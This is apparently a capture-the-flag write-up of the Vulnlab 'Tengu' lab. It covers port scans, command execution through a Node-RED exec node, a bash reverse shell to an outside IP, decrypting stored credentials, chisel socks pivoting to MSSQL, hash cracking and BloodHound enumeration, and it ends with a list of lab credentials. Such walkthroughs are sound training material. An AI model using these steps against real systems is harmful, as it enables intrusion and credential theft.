# Vulnlab - Tengu

## DC.tengu.vl

```bash
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.tengu.vl
| Issuer: commonName=DC.tengu.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-14T15:26:33
| Not valid after:  2025-03-16T15:26:33
| MD5:   b350:11ed:41ce:ff32:a34f:0088:ce22:96f5
|_SHA-1: 711b:6409:e399:0771:d3d3:7eba:1938:5914:7c84:7528
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SQL.tengu.vl

```bash
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-09-15T15:30:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SQL.tengu.vl
| Issuer: commonName=SQL.tengu.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-14T15:26:45
| Not valid after:  2025-03-16T15:26:45
| MD5:   3cd6:9298:18df:b91e:5194:c958:0df4:528b
|_SHA-1: b304:c807:0de4:a171:0c1a:8b16:1f3e:bd29:2e21:99b5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

##

```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 41:c7:d4:28:ec:d8:5b:aa:97:ee:c0:be:3c:e3:aa:73 (ED25519)
1880/tcp open  vsat-control?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Both windows hosts had only RDP service enabled, on linux hosts, there was something hosted on port 1880 which on googling shows it runs Node-RED, which is a flow based development tool for visual programming used in IoT devices

<img src="https://i.imgur.com/DVKxUbk.png"/>

Node-RED is known for getting remote command execution (RCE), to achieve this, we'll need to create a flow by timestamp block following exec block

<img src="https://i.imgur.com/CuLDFKt.png"/>

Replacing the curl command with bash reverse shell

<img src="https://i.imgur.com/HCcZ8G6.png"/>

```bash
bash -i >& /dev/tcp/10.8.0.136/2222 0>&1
```

After having the shell, it can be stabilized with python3 to use it as a normal shell

<img src="https://i.imgur.com/ZhpmGCP.png"/>

From `nodered` directory, we can find some type of hashed password but not really sure who this belongs to and how this can be cracked

<img src="https://i.imgur.com/RgdICoH.png"/>

From sql node properties, we can see the connection string with the username `nodered_connector`

<img src="https://i.imgur.com/DI5KPTP.png"/>

So there's a script to decrypt the node-red credentials, which needs `flows_cred.json` and  `.config.runtime.json`
https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519

<img src="https://i.imgur.com/wSSYj93.png"/>

In order to connect to MSSQL, we'll need to performing pivoting since that service isn't exposed we'll use chisel socks proxy

```bash
chisel server --reverse -p 3000
chisel client 10.8.0.136:3000 R:socks
```

<img src="https://i.imgur.com/nsUiv1Y.png"/>

With this, we'll be able to reach port 1433 on sql.tengu.vl

<img src="https://i.imgur.com/7XULYy4.png"/>

Trying to enable `xp_cmdshell` resulted in no luck as this user didn't had privileged in mssql

<img src="https://i.imgur.com/JoofgoC.png"/>

Enumerating the databases, there are two, which are not available by default, `Dev` and `Demo`

<img src="https://i.imgur.com/5fPlFgo.png"/>

Dev didn't had anything interesting while there was one set of credential from Demo

<img src="https://i.imgur.com/001siDc.png"/>

Attempting to crack this with rockyou.txt didn't work as the password wasn't present there however crackstation came in handy here

<img src="https://i.imgur.com/fLZciwp.png"/>

<img src="https://i.imgur.com/62buPKb.png"/>

Having the credentials, we can verify if this is a valid domain user

<img src="https://i.imgur.com/e6T9dEw.png"/>

With `bloodhound-python`, the domain can be enumerated

```bash
proxychains bloodhound-python -d tengu.vl -u t2_m.winters -p 'Tengu123' -c all -ns 10.10.183.37 
```

<img src="https://i.imgur.com/EwzmEoc.png"/>


# References

- https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/
- https://gist.github.com/Yeeb1/fe9adcd39306e3ced6bdfc7758a43519

```
nodered_connector:DreamPuppyOverall25
t2_m.winters:af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147
t2_m.winters:Tengu123

```
